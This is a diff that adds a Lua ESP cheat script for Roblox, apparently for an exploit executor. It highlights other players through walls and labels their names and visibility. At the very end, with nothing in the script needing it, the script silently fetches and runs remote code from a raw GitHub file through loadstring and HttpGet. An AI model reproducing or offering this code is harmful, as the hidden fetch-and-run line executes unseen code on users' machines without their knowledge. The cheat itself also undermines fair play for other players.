@@ -1,0 +1,177 @@
+if getgenv then getgenv().esp = getgenv().esp or {} else _G.esp = _G.esp or {} end
+local env = getgenv and getgenv().esp or _G.esp
+local players = game:GetService("Players")
+local run_service = game:GetService("RunService")
+local local_player = players.LocalPlayer
+local esp = {}
+
+local function get_hrp(char)
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if hrp then return hrp end
+    return char:WaitForChild("HumanoidRootPart")
+end
+
+local function create_billboard(adorn, text)
+    local bb = Instance.new("BillboardGui")
+    bb.Name = "esp_billboard"
+    bb.Adornee = adorn
+    bb.AlwaysOnTop = true
+    bb.Size = UDim2.fromOffset(150, 26)
+    bb.StudsOffset = Vector3.new(0, 3.5, 0)
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.fromScale(1, 1)
+    frame.BackgroundColor3 = Color3.new(0, 0, 0)
+    frame.BackgroundTransparency = 0.35
+    frame.Parent = bb
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = frame
+
+    local padding = Instance.new("UIPadding")
+    padding.PaddingTop = UDim.new(0, 2)
+    padding.PaddingBottom = UDim.new(0, 2)
+    padding.PaddingLeft = UDim.new(0, 6)
+    padding.PaddingRight = UDim.new(0, 6)
+    padding.Parent = frame
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.fromScale(1, 1)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.Gotham
+    label.TextScaled = true
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.TextStrokeTransparency = 0.6
+    label.Text = text
+    label.Parent = frame
+
+    return bb, label
+end
+
+local function create_highlight(parent)
+    local h = Instance.new("Highlight")
+    h.Name = "esp_highlight"
+    h.Adornee = parent
+    h.Parent = parent
+    h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    h.FillTransparency = 0.75
+    h.OutlineTransparency = 0
+    h.OutlineColor = Color3.new(1, 1, 1)
+    h.FillColor = Color3.fromRGB(0, 170, 255)
+    return h
+end
+
+local function attach_esp(p)
+    if p == local_player then return end
+
+    local char = p.Character or p.CharacterAdded:Wait()
+    local hrp = get_hrp(char)
+    local highlight = create_highlight(char)
+    local billboard, label = create_billboard(hrp, p.DisplayName .. " | 👀")
+    billboard.Parent = hrp
+
+    esp[p] = {char = char, hrp = hrp, highlight = highlight, billboard = billboard, label = label}
+
+    local function on_removed(_, parent)
+        if not parent then
+            if esp[p] then
+                if esp[p].highlight then esp[p].highlight:Destroy() end
+                if esp[p].billboard then esp[p].billboard:Destroy() end
+                esp[p] = nil
+            end
+        end
+    end
+
+    char.AncestryChanged:Connect(on_removed)
+
+    p.CharacterAdded:Connect(function(new_char)
+        char = new_char
+        hrp = get_hrp(char)
+        if esp[p] and esp[p].highlight then esp[p].highlight:Destroy() end
+        if esp[p] and esp[p].billboard then esp[p].billboard:Destroy() end
+
+        local new_h = create_highlight(char)
+        local new_b, new_l = create_billboard(hrp, p.DisplayName .. " | 👀")
+        new_b.Parent = hrp
+
+        esp[p] = {char = char, hrp = hrp, highlight = new_h, billboard = new_b, label = new_l}
+
+        char.AncestryChanged:Connect(on_removed)
+    end)
+end
+
+local function stop()
+    if env.player_added then env.player_added:Disconnect() end
+    if env.player_removed then env.player_removed:Disconnect() end
+    if env.heartbeat then env.heartbeat:Disconnect() end
+
+    for _, data in pairs(esp) do
+        if data.highlight then data.highlight:Destroy() end
+        if data.billboard then data.billboard:Destroy() end
+    end
+    esp = {}
+
+    for _, plr in ipairs(players:GetPlayers()) do
+        if plr.Character then
+            for _, obj in ipairs(plr.Character:GetDescendants()) do
+                if obj:IsA("BillboardGui") and obj.Name == "esp_billboard" then
+                    obj:Destroy()
+                elseif obj:IsA("Highlight") and obj.Name == "esp_highlight" then
+                    obj:Destroy()
+                end
+            end
+        end
+    end
+
+    env.running = false
+end
+
+local function is_invisible(char)
+    for _, part in ipairs(char:GetDescendants()) do
+        if part:IsA("BasePart") and part.Transparency < 1 and part.Name ~= "HumanoidRootPart" then
+            return false
+        end
+    end
+    return true
+end
+
+local function start()
+    for _, plr in ipairs(players:GetPlayers()) do
+        attach_esp(plr)
+    end
+
+    env.player_added = players.PlayerAdded:Connect(attach_esp)
+
+    env.player_removed = players.PlayerRemoving:Connect(function(p)
+        local e = esp[p]
+        if e then
+            if e.highlight then e.highlight:Destroy() end
+            if e.billboard then e.billboard:Destroy() end
+            esp[p] = nil
+        end
+    end)
+
+    env.heartbeat = run_service.Heartbeat:Connect(function()
+        for p, data in pairs(esp) do
+            if data and data.char and data.label then
+                local vis = is_invisible(data.char) and "👻" or "👀"
+                data.label.Text = p.DisplayName .. " | " .. vis
+                if not data.highlight or not data.highlight.Parent then
+                    data.highlight = create_highlight(data.char)
+                end
+            end
+        end
+    end)
+
+    env.running = true
+end
+
+env.stop = stop
+env.start = start
+
+if env.running then stop() end
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Hopper/refs/heads/main/releaseass.txt"))()
+end)
+start()
